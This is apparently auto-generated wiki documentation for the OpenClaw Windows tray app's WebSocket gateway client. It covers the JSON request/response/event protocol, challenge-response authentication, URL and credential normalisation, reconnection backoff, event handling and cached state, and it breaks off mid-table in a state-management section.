This page documents the WebSocket-based communication protocol between the OpenClaw Windows Hub and the OpenClaw Gateway. The gateway acts as a central orchestration server (typically running on macOS or WSL2) that coordinates AI assistant sessions, channel integrations, and connected nodes.

For details about the `OpenClawGatewayClient` implementation, see [Gateway Client](#3.1). For information about the shared data models exchanged with the gateway, see [Data Models](#3.2). For URL normalization and validation utilities, see [URL Handling & Validation](#3.3).

Note that this page covers **Operator Mode** communication. For **Node Mode** communication (where Windows acts as a remotely controllable agent), see [Node Mode](#4).

---

## Communication Architecture

The gateway communication layer provides a persistent WebSocket connection between the Windows tray application and the OpenClaw Gateway server. The gateway serves as the central hub for all AI assistant activity, session state, and channel integrations.

```mermaid
graph TB
    TrayApp["App (WinUI)<br/>_gatewayClient<br/>_dispatcherQueue"]
    GatewayClient["OpenClawGatewayClient<br/>WebSocket connection<br/>Event handlers"]
    WebSocket["ClientWebSocket<br/>System.Net.WebSockets"]
    Gateway["OpenClaw Gateway<br/>ws://localhost:18789<br/>Mac/WSL2 host"]
    
    TrayApp -->|"ConnectAsync()<br/>RequestSessionsAsync()<br/>SendChatMessageAsync()"| GatewayClient
    GatewayClient -->|"Invoke on UI thread"| TrayApp
    GatewayClient -->|"SendRawAsync()<br/>ReceiveAsync()"| WebSocket
    WebSocket <-->|"WebSocket frames<br/>JSON messages"| Gateway
    
    GatewayClient -.->|"StatusChanged event"| TrayApp
    GatewayClient -.->|"SessionsUpdated event"| TrayApp
    GatewayClient -.->|"ActivityChanged event"| TrayApp
    GatewayClient -.->|"NotificationReceived event"| TrayApp
    GatewayClient -.->|"ChannelHealthUpdated event"| TrayApp
```

**Sources:** [src/OpenClaw.Shared/OpenClawGatewayClient.cs:1-1450](), [src/OpenClaw.Tray.WinUI/App.xaml.cs:1-2457]()

---

## WebSocket Protocol

### Message Format

The gateway protocol uses JSON-based WebSocket messages with three primary message types:

| Type | Direction | Purpose |
|------|-----------|---------|
| `req` | Client → Gateway | Request from client to gateway |
| `res` | Gateway → Client | Response to a previous request |
| `event` | Gateway → Client | Unsolicited event notification |

```mermaid
sequenceDiagram
    participant C as OpenClawGatewayClient
    participant G as Gateway
    
    Note over C,G: Request/Response Pattern
    C->>G: type: "req"<br/>id: "uuid"<br/>method: "sessions.list"
    G->>C: type: "res"<br/>id: "uuid"<br/>ok: true<br/>payload: {...}
    
    Note over C,G: Event Stream Pattern
    G->>C: type: "event"<br/>event: "agent"<br/>payload: {...}
    G->>C: type: "event"<br/>event: "chat"<br/>payload: {...}
```

**Sources:** [src/OpenClaw.Shared/OpenClawGatewayClient.cs:525-555]()

### Request Message Structure

Requests sent by the client follow this structure:

```json
{
  "type": "req",
  "id": "unique-request-id",
  "method": "method-name",
  "params": { /* method-specific parameters */ }
}
```

The `id` field is a unique identifier used to correlate responses. The client tracks pending requests in `_pendingRequestMethods` to handle responses appropriately.

**Sources:** [src/OpenClaw.Shared/OpenClawGatewayClient.cs:427-434](), [src/OpenClaw.Shared/OpenClawGatewayClient.cs:436-469]()

### Response Message Structure

Responses from the gateway include:

```json
{
  "type": "res",
  "id": "matching-request-id",
  "ok": true,
  "payload": { /* response data */ }
}
```

For errors:

```json
{
  "type": "res",
  "id": "matching-request-id",
  "ok": false,
  "error": "error message"
}
```

**Sources:** [src/OpenClaw.Shared/OpenClawGatewayClient.cs:557-617]()

### Event Message Structure

Events are push notifications from the gateway:

```json
{
  "type": "event",
  "event": "event-name",
  "payload": { /* event data */ },
  "sessionKey": "optional-session-key"
}
```

**Sources:** [src/OpenClaw.Shared/OpenClawGatewayClient.cs:762-786]()

---

## Authentication and Connection Flow

### Connection Establishment

The gateway uses a challenge-response authentication mechanism to establish connections:

```mermaid
sequenceDiagram
    participant Client as OpenClawGatewayClient
    participant WS as ClientWebSocket
    participant GW as Gateway
    
    Client->>WS: ConnectAsync(uri)
    Note over WS: Set Origin header<br/>Set Authorization header (if credentials)
    WS->>GW: WebSocket handshake
    GW->>WS: Connection established
    
    WS->>Client: Start ListenForMessagesAsync()
    
    GW->>Client: event: connect.challenge<br/>payload: { nonce }
    Client->>GW: req: connect<br/>auth: { token }<br/>role: "operator"
    GW->>Client: res: hello-ok
    
    Note over Client: StatusChanged → Connected
    Client->>GW: req: health
    Client->>GW: req: sessions.list
    Client->>GW: req: usage.status
```

**Sources:** [src/OpenClaw.Shared/OpenClawGatewayClient.cs:69-108](), [src/OpenClaw.Shared/OpenClawGatewayClient.cs:789-800](), [src/OpenClaw.Shared/OpenClawGatewayClient.cs:341-372]()

### URL and Credential Handling

Gateway URLs support multiple formats and embedded credentials:

| Input URL | Normalized WebSocket URL | Credentials |
|-----------|-------------------------|-------------|
| `http://localhost:18789` | `ws://localhost:18789` | None |
| `https://host.example.com` | `wss://host.example.com` | None |
| `wss://user:pass@host.com` | `wss://host.com` | Extracted as `user:pass` |

The `GatewayUrlHelper` class normalizes URLs and extracts credentials, which are then sent either as:
- HTTP Basic Auth header (for embedded credentials)
- Bearer token in the `connect` request payload

**Sources:** [src/OpenClaw.Shared/GatewayUrlHelper.cs:1-159](), [src/OpenClaw.Shared/OpenClawGatewayClient.cs:59-67](), [src/OpenClaw.Shared/OpenClawGatewayClient.cs:85-92]()

### Origin Header

The client sets an `Origin` header based on the gateway URL scheme to satisfy CORS requirements:

- `ws://` → `Origin: http://`
- `wss://` → `Origin: https://`

**Sources:** [src/OpenClaw.Shared/OpenClawGatewayClient.cs:79-83]()

---

## Gateway Methods

The gateway client implements multiple request methods for different operations:

```mermaid
graph TB
    subgraph "Core Methods"
        Health["health<br/>Deep health check"]
        Connect["connect<br/>Authentication handshake"]
    end
    
    subgraph "Session Management"
        SessionsList["sessions.list<br/>Get active sessions"]
        SessionsPreview["sessions.preview<br/>Get session content preview"]
        SessionsPatch["sessions.patch<br/>Update session config"]
        SessionsReset["sessions.reset<br/>Clear session history"]
        SessionsDelete["sessions.delete<br/>Archive session"]
        SessionsCompact["sessions.compact<br/>Trim session log"]
    end
    
    subgraph "Usage Tracking"
        Usage["usage<br/>Legacy usage data"]
        UsageStatus["usage.status<br/>Provider status & limits"]
        UsageCost["usage.cost<br/>Cost breakdown by day"]
    end
    
    subgraph "Channel Control"
        ChannelStart["channel.start<br/>Start channel integration"]
        ChannelStop["channel.stop<br/>Stop channel integration"]
    end
    
    subgraph "Node Management"
        NodeList["node.list<br/>Connected node inventory"]
    end
    
    subgraph "Chat"
        ChatSend["chat.send<br/>Send message to AI"]
    end
```

**Sources:** [src/OpenClaw.Shared/OpenClawGatewayClient.cs:128-314](), [src/OpenClaw.Shared/OpenClawGatewayClient.cs:172-266]()

### Method Categories

| Category | Methods | Purpose |
|----------|---------|---------|
| Health | `health` | Check gateway and channel health |
| Sessions | `sessions.list`, `sessions.preview`, `sessions.patch`, `sessions.reset`, `sessions.delete`, `sessions.compact` | Session lifecycle and configuration |
| Usage | `usage`, `usage.status`, `usage.cost` | Token usage and cost tracking |
| Channels | `channel.start`, `channel.stop` | Control integrations (Telegram, Email, etc.) |
| Nodes | `node.list` | Query connected node agents |
| Chat | `chat.send` | Send messages to AI assistant |

**Sources:** [src/OpenClaw.Shared/OpenClawGatewayClient.cs:620-656]()

### Unsupported Method Detection

The client tracks unsupported methods to avoid repeated failures on older gateway versions:

```csharp
private bool _usageStatusUnsupported;
private bool _usageCostUnsupported;
private bool _sessionPreviewUnsupported;
private bool _nodeListUnsupported;
```

When a method returns "unknown method" error, the corresponding flag is set and the client falls back to alternative approaches or skips the request.

**Sources:** [src/OpenClaw.Shared/OpenClawGatewayClient.cs:33-44](), [src/OpenClaw.Shared/OpenClawGatewayClient.cs:659-704]()

---

## Event Streaming

The gateway pushes real-time events to all connected clients. These events drive UI updates in the tray application:

### Event Types

```mermaid
graph LR
    subgraph "Gateway Events"
        ConnectChallenge["connect.challenge<br/>Authentication challenge"]
        Health["health<br/>Channel status update"]
        Agent["agent<br/>Job/tool activity"]
        Chat["chat<br/>Assistant messages"]
        Session["session<br/>Session state changes"]
    end
    
    ConnectChallenge -->|"Triggers"| SendConnect["Send connect request"]
    Health -->|"Triggers"| UpdateChannels["ChannelHealthUpdated event"]
    Agent -->|"Triggers"| UpdateActivity["ActivityChanged event"]
    Chat -->|"Triggers"| ShowNotification["NotificationReceived event"]
    Session -->|"Triggers"| RefreshSessions["Request sessions.list"]
```

**Sources:** [src/OpenClaw.Shared/OpenClawGatewayClient.cs:762-786]()

### Agent Activity Events

Agent events track AI assistant activity in real-time. They include two stream types:

| Stream | Purpose | States |
|--------|---------|--------|
| `job` | High-level job execution | `pending`, `running`, `done`, `error` |
| `tool` | Individual tool invocations | `start`, `running`, `result` |

Tool events include detailed information about the specific tool being used and its arguments (commands, file paths, queries, etc.).

**Sources:** [src/OpenClaw.Shared/OpenClawGatewayClient.cs:802-920]()

### Chat Events

Chat events deliver assistant responses and notifications. The client supports both legacy and new message formats:

**Legacy format:**
```json
{
  "type": "event",
  "event": "chat",
  "payload": {
    "type": "notification",
    "title": "Build Complete",
    "message": "Your project built successfully"
  }
}
```

**New format:**
```json
{
  "type": "event",
  "event": "chat",
  "payload": {
    "message": {
      "role": "assistant",
      "content": [
        { "type": "text", "text": "Build complete!" }
      ]
    },
    "metadata": {
      "channel": "telegram",
      "intent": "build"
    }
  }
}
```

**Sources:** [src/OpenClaw.Shared/OpenClawGatewayClient.cs:922-1065]()

---

## Connection Management

### Reconnection Strategy

The client implements exponential backoff for reconnection attempts:

```csharp
private static readonly int[] BackoffMs = 
    { 1000, 2000, 4000, 8000, 15000, 30000, 60000 };
```

The backoff delay increases with each failed attempt, capping at 60 seconds.

**Sources:** [src/OpenClaw.Shared/OpenClawGatewayClient.cs:23](), [src/OpenClaw.Shared/OpenClawGatewayClient.cs:318-339]()

### Message Loop

The client runs a continuous message loop in `ListenForMessagesAsync()`:

```mermaid
stateDiagram-v2
    [*] --> Listening
    
    Listening --> ReceiveFrame: await ReceiveAsync()
    ReceiveFrame --> Accumulate: MessageType == Text
    ReceiveFrame --> CloseDetected: MessageType == Close
    
    Accumulate --> ProcessMessage: EndOfMessage == true
    Accumulate --> ReceiveFrame: EndOfMessage == false
    
    ProcessMessage --> Listening: Parse and dispatch
    
    CloseDetected --> Disconnected: StatusChanged(Disconnected)
    
    Listening --> Error: WebSocketException
    Error --> Reconnect: ReconnectWithBackoffAsync()
    Reconnect --> [*]: _disposed == true
    Reconnect --> Listening: ConnectAsync() success
```

**Sources:** [src/OpenClaw.Shared/OpenClawGatewayClient.cs:473-523]()

### Health Monitoring

The tray application runs periodic health checks via timers:

```csharp
// In App.xaml.cs
_healthCheckTimer = new System.Timers.Timer(30000); // 30 seconds
_healthCheckTimer.Elapsed += async (s, e) => 
{
    if (_gatewayClient != null)
        await _gatewayClient.CheckHealthAsync();
};
```

Health checks serve dual purposes:
1. Verify gateway connectivity
2. Retrieve current channel health status

**Sources:** [src/OpenClaw.Shared/OpenClawGatewayClient.cs:128-153]()

---

## Integration with Tray Application

### Initialization

The `App` class initializes the gateway client during application startup:

```mermaid
sequenceDiagram
    participant App as App.OnLaunched()
    participant Settings as SettingsManager
    participant Client as OpenClawGatewayClient
    participant Timer as Health Check Timer
    
    App->>Settings: Load settings
    Settings-->>App: Token, Gateway URL
    
    App->>Client: new OpenClawGatewayClient(url, token)
    App->>Client: Subscribe to events
    App->>Client: ConnectAsync()
    
    Client-->>App: StatusChanged(Connecting)
    Client-->>App: StatusChanged(Connected)
    
    App->>Timer: Start health check timer (30s)
    App->>Client: CheckHealthAsync()
    App->>Client: RequestSessionsAsync()
    App->>Client: RequestUsageAsync()
```

**Sources:** [src/OpenClaw.Tray.WinUI/App.xaml.cs:251-277]()

### Event Marshaling to UI Thread

All gateway events are marshaled to the WinUI dispatcher queue to ensure thread safety:

```csharp
private void InitializeGatewayClient()
{
    _gatewayClient = new OpenClawGatewayClient(
        _settings!.GatewayUrl, 
        _settings!.Token, 
        Logger.Instance);
    
    // Marshal all events to UI thread
    _gatewayClient.StatusChanged += (s, status) => 
        _dispatcherQueue?.TryEnqueue(() => OnStatusChanged(status));
        
    _gatewayClient.SessionsUpdated += (s, sessions) => 
        _dispatcherQueue?.TryEnqueue(() => OnSessionsUpdated(sessions));
    
    // ... additional event subscriptions
}
```

**Sources:** [src/OpenClaw.Tray.WinUI/App.xaml.cs:1061-1209]()

### Data Flow: Session List Request

A complete request/response cycle for session data:

```mermaid
sequenceDiagram
    participant UI as Tray Menu Click
    participant App as App (UI Thread)
    participant Client as OpenClawGatewayClient
    participant WS as WebSocket
    participant GW as Gateway
    
    UI->>App: User clicks tray icon
    App->>Client: RequestSessionsAsync()
    
    Client->>Client: Generate request ID
    Client->>Client: TrackPendingRequest(id, "sessions.list")
    Client->>WS: SendAsync(JSON)
    WS->>GW: WebSocket frame
    
    GW->>WS: Response frame
    WS->>Client: ReceiveAsync()
    
    Client->>Client: ProcessMessage(json)
    Client->>Client: HandleResponse(root)
    Client->>Client: TakePendingRequestMethod(id)
    Client->>Client: ParseSessions(payload)
    Client->>Client: SessionsUpdated event
    
    Client-->>App: Event on background thread
    App->>App: _dispatcherQueue.TryEnqueue()
    App->>App: OnSessionsUpdated() on UI thread
    App->>UI: Update menu with session data
```

**Sources:** [src/OpenClaw.Shared/OpenClawGatewayClient.cs:172-175](), [src/OpenClaw.Shared/OpenClawGatewayClient.cs:385-399](), [src/OpenClaw.Tray.WinUI/App.xaml.cs:1215-1273]()

---

## Tracked State

The `OpenClawGatewayClient` maintains local caches of server state to minimize redundant requests:

```csharp
// In OpenClawGatewayClient
private readonly Dictionary<string, SessionInfo> _sessions = new();
private readonly Dictionary<string, GatewayNodeInfo> _nodes = new();
private GatewayUsageInfo? _usage;
private GatewayUsageStatusInfo? _usageStatus;
private GatewayCostUsageInfo? _usageCost;
```

These caches are updated when responses arrive and exposed via events to the application layer.

**Sources:** [src/OpenClaw.Shared/OpenClawGatewayClient.cs:25-35]()

The `App` class maintains its own view of the current state for UI rendering:

```csharp
// In App.xaml.cs
private ConnectionStatus _currentStatus = ConnectionStatus.Disconnected;
private AgentActivity? _currentActivity;
private ChannelHealth[] _lastChannels = Array.Empty<ChannelHealth>();
private SessionInfo[] _lastSessions = Array.Empty<SessionInfo>();
private GatewayNodeInfo[] _lastNodes = Array.Empty<GatewayNodeInfo>();
private GatewayUsageInfo? _lastUsage;
```

**Sources:** [src/OpenClaw.Tray.WinUI/App.xaml.cs:44-54]()

---

## Error Handling

### Connection Errors

Connection failures trigger the reconnection backoff strategy. The `StatusChanged` event notifies the UI:

```csharp
public enum ConnectionStatus
{
    Disconnected,
    Connecting,
    Connected,
    Error
}
```

**Sources:** [src/OpenClaw.Shared/Models.cs:3-9]()

### Request Errors

Failed requests emit `ok: false` responses with error messages. The client handles these by:

1. Matching the error to the original request method
2. Checking for "unknown method" errors to set unsupported flags
3. Emitting completion events with error details for session commands

**Sources:** [src/OpenClaw.Shared/OpenClawGatewayClient.cs:659-704]()

### WebSocket Exceptions

The message loop catches and handles various WebSocket exceptions:

```csharp
catch (WebSocketException ex) when 
    (ex.WebSocketErrorCode == WebSocketError.ConnectionClosedPrematurely)
{
    _logger.Warn("Connection closed prematurely");
    StatusChanged?.Invoke(this, ConnectionStatus.Disconnected);
}
```

After any exception, the client attempts to reconnect unless `_disposed` is true.

**Sources:** [src/OpenClaw.Shared/OpenClawGatewayClient.cs:504-522]()

---

## Summary

The gateway communication layer provides:

- **Persistent WebSocket Connection**: Maintains a long-lived connection with automatic reconnection
- **Request/Response Protocol**: Structured JSON messages with request tracking
- **Event Streaming**: Real-time push notifications for activity and state changes
- **Authentication**: Challenge-response flow with token-based auth
- **Thread Safety**: Automatic UI thread marshaling for all events
- **URL Flexibility**: Supports ws://, wss://, http://, https:// with embedded credentials
- **Graceful Degradation**: Detects unsupported methods and adapts behavior
- **Error Recovery**: Exponential backoff reconnection strategy

This architecture enables the Windows tray application to act as a real-time operator console for the OpenClaw AI assistant system.

**Sources:** [src/OpenClaw.Shared/OpenClawGatewayClient.cs:1-1450](), [src/OpenClaw.Tray.WinUI/App.xaml.cs:1-2457](), [src/OpenClaw.Shared/Models.cs:1-457]()

---

# Page: Gateway Client

# Gateway Client

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [src/OpenClaw.Shared/GatewayUrlHelper.cs](src/OpenClaw.Shared/GatewayUrlHelper.cs)
- [src/OpenClaw.Shared/OpenClawGatewayClient.cs](src/OpenClaw.Shared/OpenClawGatewayClient.cs)
- [src/OpenClaw.Tray.WinUI/App.xaml.cs](src/OpenClaw.Tray.WinUI/App.xaml.cs)
- [src/OpenClaw.Tray.WinUI/Windows/TrayMenuWindow.xaml.cs](src/OpenClaw.Tray.WinUI/Windows/TrayMenuWindow.xaml.cs)
- [tests/OpenClaw.Shared.Tests/GatewayUrlHelperTests.cs](tests/OpenClaw.Shared.Tests/GatewayUrlHelperTests.cs)
- [tests/OpenClaw.Shared.Tests/WindowsNodeClientTests.cs](tests/OpenClaw.Shared.Tests/WindowsNodeClientTests.cs)

</details>



The Gateway Client is the WebSocket-based communication layer that connects the Windows tray application to the OpenClaw Gateway server. This page documents the `OpenClawGatewayClient` class and related URL handling utilities.

For information about Node Mode's separate client implementation, see [Node Client & Pairing](#4.1). For details about the data models exchanged with the gateway, see [Data Models](#3.2).

---

## Purpose and Scope

The `OpenClawGatewayClient` class provides:

- **WebSocket Connection Management**: Establishes and maintains a persistent connection to the gateway
- **Authentication**: Handles token-based authentication and challenge-response handshake
- **Request/Response Pattern**: Sends requests with unique IDs and correlates responses
- **Event Stream**: Receives real-time events (agent activity, notifications, health updates)
- **Automatic Reconnection**: Implements exponential backoff for connection recovery
- **State Tracking**: Maintains cached copies of sessions, usage, nodes, and channel health

**Sources:** [src/OpenClaw.Shared/OpenClawGatewayClient.cs:1-70]()

---

## Architecture Overview

```mermaid
graph TB
    subgraph "Tray Application"
        App["App.xaml.cs<br/>_gatewayClient"]
    end
    
    subgraph "OpenClaw.Shared Library"
        Client["OpenClawGatewayClient"]
        UrlHelper["GatewayUrlHelper"]
        Logger["IOpenClawLogger"]
        Models["Data Models<br/>SessionInfo<br/>AgentActivity<br/>ChannelHealth"]
    end
    
    subgraph "System Libraries"
        WebSocket["ClientWebSocket<br/>.NET"]
        JSON["JsonDocument<br/>JsonSerializer"]
    end
    
    subgraph "OpenClaw Gateway"
        Gateway["Gateway Server<br/>ws://localhost:18789"]
    end
    
    App -->|"ConnectAsync()<br/>CheckHealthAsync()<br/>RequestSessionsAsync()"| Client
    Client -->|"NormalizeForWebSocket()<br/>ExtractCredentials()"| UrlHelper
    Client -->|"Info()<br/>Warn()<br/>Error()"| Logger
    Client -->|"SendAsync()<br/>ReceiveAsync()"| WebSocket
    Client -->|"Parse()<br/>Serialize()"| JSON
    WebSocket <-->|"WebSocket Protocol"| Gateway
    Client -->|"StatusChanged<br/>ActivityChanged<br/>SessionsUpdated"| App
    Client -->|"Parse to"| Models
    
    style Client fill:#e1f5ff
```

**Sources:** [src/OpenClaw.Shared/OpenClawGatewayClient.cs:12-67](), [src/OpenClaw.Tray.WinUI/App.xaml.cs:35-36,273-274]()

---

## Class Structure

| Component | Type | Purpose |
|-----------|------|---------|
| `OpenClawGatewayClient` | Class | Main gateway client implementation |
| `ClientWebSocket` | Field | Underlying WebSocket connection |
| `ConnectionStatus` | Enum | Connection state (Disconnected, Connecting, Connected, Error) |
| `IOpenClawLogger` | Interface | Logging abstraction |
| `GatewayUrlHelper` | Static Class | URL normalization and credential extraction |

**Key Fields:**

```
_webSocket: ClientWebSocket?
_gatewayUrl: string (normalized WebSocket URL)
_token: string (authentication token)
_credentials: string? (extracted from URL user-info)
_cts: CancellationTokenSource
_sessions: Dictionary<string, SessionInfo>
_nodes: Dictionary<string, GatewayNodeInfo>
_usage: GatewayUsageInfo?
_pendingRequestMethods: Dictionary<string, string> (requestId -> method)
```

**Sources:** [src/OpenClaw.Shared/OpenClawGatewayClient.cs:12-36]()

---

## Connection Lifecycle

```mermaid
sequenceDiagram
    participant App as "App.xaml.cs"
    participant Client as "OpenClawGatewayClient"
    participant WS as "ClientWebSocket"
    participant Gateway as "Gateway Server"
    
    App->>Client: "new OpenClawGatewayClient(url, token)"
    Note over Client: "Normalize URL<br/>Extract credentials"
    
    App->>Client: "ConnectAsync()"
    Client->>Client: "StatusChanged(Connecting)"
    Client->>WS: "new ClientWebSocket()"
    Note over Client: "Set Origin header<br/>Set Authorization header (if creds)"
    Client->>WS: "ConnectAsync(uri)"
    WS->>Gateway: "WebSocket handshake"
    Gateway-->>WS: "Connection established"
    Client->>Client: "ListenForMessagesAsync()"
    
    Gateway->>Client: "event: connect.challenge<br/>{nonce}"
    Client->>Gateway: "req: connect<br/>{token, role, scopes}"
    Gateway-->>Client: "res: hello-ok"
    Client->>Client: "StatusChanged(Connected)"
    Client->>Gateway: "req: health"
    Client->>Gateway: "req: sessions.list"
    Client->>Gateway: "req: usage.status"
    
    Note over Client,Gateway: "Connection active"
    
    Gateway->>Client: "event: agent<br/>{activity}"
    Client->>App: "ActivityChanged event"
```

**Sources:** [src/OpenClaw.Shared/OpenClawGatewayClient.cs:69-108,341-372,473-523,789-800]()

### Connection States

| State | Description | Triggers |
|-------|-------------|----------|
| `Disconnected` | Not connected | Initial state, after `DisconnectAsync()`, server close |
| `Connecting` | Connection in progress | During `ConnectAsync()`, reconnection attempts |
| `Connected` | Authenticated and ready | After `hello-ok` response |
| `Error` | Connection failed | Exception during connect, send, or receive |

**Sources:** [src/OpenClaw.Shared/OpenClawGatewayClient.cs:44,73,106,124,150,336,515]()

---

## URL Handling and Credential Extraction

The `GatewayUrlHelper` class normalizes gateway URLs and extracts embedded credentials.

### URL Normalization

Gateway URLs can be provided in multiple formats:

| Input Format | Normalized Output | Notes |
|--------------|-------------------|-------|
| `http://localhost:18789` | `ws://localhost:18789` | HTTP → WS |
| `https://host.example.com` | `wss://host.example.com` | HTTPS → WSS |
| `ws://localhost:18789` | `ws://localhost:18789` | Already WS |
| `wss://host.example.com` | `wss://host.example.com` | Already WSS |
| `wss://user:pass@host.com` | `wss://host.com` | Credentials stripped |

**Sources:** [src/OpenClaw.Shared/GatewayUrlHelper.cs:88-133](), [tests/OpenClaw.Shared.Tests/GatewayUrlHelperTests.cs:10-23,59-103]()

### Credential Extraction

Credentials can be embedded in the URL user-info section (before `@`):

```
wss://username:password@gateway.example.com
     └─────────────────┘
       Extracted as credentials
```

The credentials are:
1. Extracted via `ExtractCredentials()` (URL-encoded format)
2. Decoded via `DecodeCredentials()` (handles `%40`, `%3A`, etc.)
3. Base64-encoded for HTTP Basic Authentication header
4. Stripped from the WebSocket URL for security

**Sources:** [src/OpenClaw.Shared/OpenClawGatewayClient.cs:61-64,85-92](), [src/OpenClaw.Shared/GatewayUrlHelper.cs:17-73]()

### Security Considerations

- Credentials are never logged in their raw form
- `SanitizeForDisplay()` removes user-info before logging
- Only `_gatewayUrlForDisplay` is used in log messages

**Sources:** [src/OpenClaw.Shared/OpenClawGatewayClient.cs:62,74](), [src/OpenClaw.Shared/GatewayUrlHelper.cs:78-86]()

---

## Authentication and Handshake

The gateway uses a challenge-response pattern for authentication:

```mermaid
sequenceDiagram
    participant Client as "OpenClawGatewayClient"
    participant Gateway as "Gateway Server"
    
    Note over Client,Gateway: "WebSocket connection established"
    
    Gateway->>Client: "event: connect.challenge<br/>{payload: {nonce}}"
    Note over Client: "Received challenge"
    
    Client->>Gateway: "req: connect<br/>{<br/>  minProtocol: 3,<br/>  maxProtocol: 3,<br/>  client: {id: 'cli', ...},<br/>  role: 'operator',<br/>  scopes: [...],<br/>  auth: {token},<br/>  ...}"
    
    Note over Gateway: "Validate token<br/>Establish session"
    
    Gateway-->>Client: "res: {<br/>  ok: true,<br/>  payload: {<br/>    type: 'hello-ok'<br/>  }}"
    
    Note over Client: "StatusChanged(Connected)<br/>Request initial state"
```

**Sources:** [src/OpenClaw.Shared/OpenClawGatewayClient.cs:789-800,341-372,580-594]()

### Connect Request Parameters

| Field | Value | Purpose |
|-------|-------|---------|
| `client.id` | `"cli"` | Native client ID (no browser security checks) |
| `client.version` | `"1.0.0"` | Client version |
| `client.platform` | `"windows"` | Operating system |
| `client.mode` | `"cli"` | Client mode |
| `client.displayName` | `"OpenClaw Windows Tray"` | Human-readable name |
| `role` | `"operator"` | Client role (vs. `"node"`) |
| `scopes` | `["operator.admin", "operator.approvals", "operator.pairing"]` | Requested permissions |
| `caps` | `[]` | Capabilities (empty for operator mode) |
| `auth.token` | User's token | Authentication credential |

**Sources:** [src/OpenClaw.Shared/OpenClawGatewayClient.cs:343-369]()

---

## Request/Response Protocol

### Request Tracking

The client tracks pending requests using a correlation ID system:

```mermaid
graph LR
    SendRequest["SendTrackedRequestAsync<br/>(method, params)"]
    GenerateID["Generate UUID<br/>requestId"]
    TrackID["pendingRequestMethods[requestId] = method"]
    SendJSON["SendRawAsync<br/>(JSON with requestId)"]
    ReceiveResponse["HandleResponse<br/>(JSON)"]
    LookupMethod["TakePendingRequestMethod<br/>(requestId)"]
    RouteResponse["HandleKnownResponse<br/>(method, payload)"]
    
    SendRequest --> GenerateID
    GenerateID --> TrackID
    TrackID --> SendJSON
    SendJSON -.->|"Gateway processes"| ReceiveResponse
    ReceiveResponse --> LookupMethod
    LookupMethod --> RouteResponse
```

**Sources:** [src/OpenClaw.Shared/OpenClawGatewayClient.cs:384-413,436-461,557-618]()

### Request Methods

| Method | Parameters | Purpose | Response Type |
|--------|-----------|---------|---------------|
| `health` | `{deep: true}` | Check gateway health | `{channels: [...]}` |
| `chat.send` | `{message}` | Send chat message | Acknowledgment |
| `sessions.list` | None | List active sessions | `{sessions: [...]}` |
| `sessions.patch` | `{key, thinkingLevel?, verboseLevel?}` | Update session settings | `{ok: true}` |
| `sessions.reset` | `{key}` | Reset session | `{ok: true}` |
| `sessions.delete` | `{key, deleteTranscript}` | Delete session | `{ok: true}` |
| `sessions.compact` | `{key, maxLines}` | Compact session log | `{ok: true}` |
| `sessions.preview` | `{keys, limit, maxChars}` | Get session previews | `{previews: {...}}` |
| `usage.status` | None | Get usage status | `{providers: [...]}` |
| `usage.cost` | `{days}` | Get cost data | `{totals, daily: [...]}` |
| `node.list` | None | List connected nodes | `{nodes: [...]}` |
| `channel.start` | `{channel}` | Start a channel | Acknowledgment |
| `channel.stop` | `{channel}` | Stop a channel | Acknowledgment |

**Sources:** [src/OpenClaw.Shared/OpenClawGatewayClient.cs:128-314,620-657]()

### Handling Unsupported Methods

The client gracefully handles gateways that don't support newer methods:

```
if (IsUnknownMethodError(message))
{
    switch (method)
    {
        case "usage.status":
            _usageStatusUnsupported = true;
            _ = RequestLegacyUsageAsync();
            break;
        case "usage.cost":
            _usageCostUnsupported = true;
            break;
        ...
    }
}
```

**Sources:** [src/OpenClaw.Shared/OpenClawGatewayClient.cs:33-44,659-704]()

---

## Event Stream

The gateway pushes real-time events to the client. Events are processed in `HandleEvent()`:

```mermaid
graph TB
    ReceiveMessage["ListenForMessagesAsync<br/>(receive loop)"]
    ParseJSON["ProcessMessage<br/>(JSON.parse)"]
    CheckType{"type == 'event'?"}
    HandleEvent["HandleEvent<br/>(root)"]
    
    subgraph "Event Handlers"
        Challenge["connect.challenge<br/>→ SendConnectMessageAsync"]
        Agent["agent<br/>→ HandleAgentEvent"]
        Health["health<br/>→ ParseChannelHealth"]
        Chat["chat<br/>→ HandleChatEvent"]
        Session["session<br/>→ HandleSessionEvent"]
    end
    
    ReceiveMessage --> ParseJSON
    ParseJSON --> CheckType
    CheckType -->|"Yes"| HandleEvent
    CheckType -->|"No"| OtherType["type == 'res'<br/>→ HandleResponse"]
    
    HandleEvent --> Challenge
    HandleEvent --> Agent
    HandleEvent --> Health
    HandleEvent --> Chat
    HandleEvent --> Session
    
    Agent --> EmitActivity["ActivityChanged event"]
    Chat --> EmitNotification["NotificationReceived event"]
    Health --> EmitChannels["ChannelHealthUpdated event"]
```

**Sources:** [src/OpenClaw.Shared/OpenClawGatewayClient.cs:473-555,762-786]()

### Event Types

| Event | Payload Fields | Triggers | Handler |
|-------|---------------|----------|---------|
| `connect.challenge` | `{nonce}` | After WebSocket connect | `HandleConnectChallenge()` → Send connect request |
| `agent` | `{stream, data, sessionKey}` | Tool execution, job state changes | `HandleAgentEvent()` → `ActivityChanged` event |
| `health` | `{channels}` | Channel status updates | Parse channels → `ChannelHealthUpdated` event |
| `chat` | `{message}` or `{payload}` | Chat messages from assistant | `HandleChatEvent()` → `NotificationReceived` event |
| `session` | `{sessionKey, action}` | Session created/updated/deleted | `HandleSessionEvent()` → Request session list |

**Sources:** [src/OpenClaw.Shared/OpenClawGatewayClient.cs:762-786]()

### Agent Activity Events

Agent events contain a `stream` field indicating the activity type:

**Job Stream (`stream: "job"`):**

```json
{
  "type": "event",
  "event": "agent",
  "sessionKey": "main",
  "payload": {
    "stream": "job",
    "data": {
      "state": "running"
    }
  }
}
```

**Tool Stream (`stream: "tool"`):**

```json
{
  "type": "event",
  "event": "agent",
  "sessionKey": "main",
  "payload": {
    "stream": "tool",
    "data": {
      "phase": "execute",
      "name": "exec_cmd",
      "args": {
        "command": "dir"
      }
    }
  }
}
```

**Sources:** [src/OpenClaw.Shared/OpenClawGatewayClient.cs:802-920]()

---

## State Management

The client maintains local copies of gateway state for quick access:

| State Field | Type | Updated By | Exposed Via |
|-------------|------|------------|-------------|
| `_sessions` | `Dictionary<string, SessionInfo>` | `sessions.list` responses | `SessionsUpdated` event |
| `_nodes` | `Dictionary<string, GatewayNodeInfo>` | `node.list` responses | `NodesUpdated` event |
| `_usage` | `GatewayUsageInfo?` | `usage` responses (legacy) | `UsageUpdated` event |
